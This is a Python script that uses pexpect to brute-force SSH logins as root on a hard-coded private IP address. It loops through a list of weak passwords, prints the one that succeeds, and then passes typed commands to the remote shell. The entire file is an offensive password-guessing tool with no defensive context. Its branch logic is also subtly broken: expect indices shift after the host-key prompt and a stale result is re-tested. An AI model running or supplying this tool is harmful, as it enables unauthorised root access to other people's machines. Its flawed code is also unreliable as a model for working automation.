import pexpect
A='Are you sure you want to continue connecting (yes/no)?'
B='Permission denied, please try again.'
C=' password:'
D='Connection timed out'
host='192.168.81.82'
usr='root'
password=[]

def connect_test(host,usr,password):
  try:
    send_mess='ssh '+usr+'@'+host
    p=pexpect.spawn(send_mess,timeout=3)
    res=p.expect([A,B,C,D])
    if res==0:
        p.sendline('yes')
        res=p.expect([pexpect.TIMEOUT,A,B,C,D])
        p.send(password)
        res=p.expect([B,'#'])
        if res==0:
            print('password error')
        if res==1:
            print('password correct,is%s' % password)

    if res==2:
        p.sendline(password)
        res=p.expect([B,'#'])
        if res==0:
            print('error')
        if res==1:
            print('correct,password is %s' % password)
            p.send(input())
            print(p.before.decode())

  except:
        print('time out,please check ip and port!')
        return

def password_test():
    pass
def main():
    password=['abc','123','asdfasdf','cisco123']
    for each in password:
        connect_test(host,usr,each)
if __name__=='__main__':
    main()
